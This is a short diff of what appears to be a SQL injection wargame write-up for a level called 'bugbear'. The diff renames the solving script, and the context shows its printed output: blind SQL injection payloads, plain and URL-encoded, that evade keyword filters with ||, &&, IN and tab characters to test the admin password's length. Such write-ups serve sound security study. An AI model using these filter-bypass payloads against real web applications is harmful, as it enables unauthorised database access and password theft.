@@ -57,7 +57,7 @@ print(f'[!] Final payload: ?pw={password}')
 ```
 
 ```
-$ python .\losqli.py
+$ python .\bugbear_script.py
 
 [!] Payload: ?no=0||id  IN("admin")&&length(pw) IN(8)
 [!] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26length%28pw%29%09IN%288%29
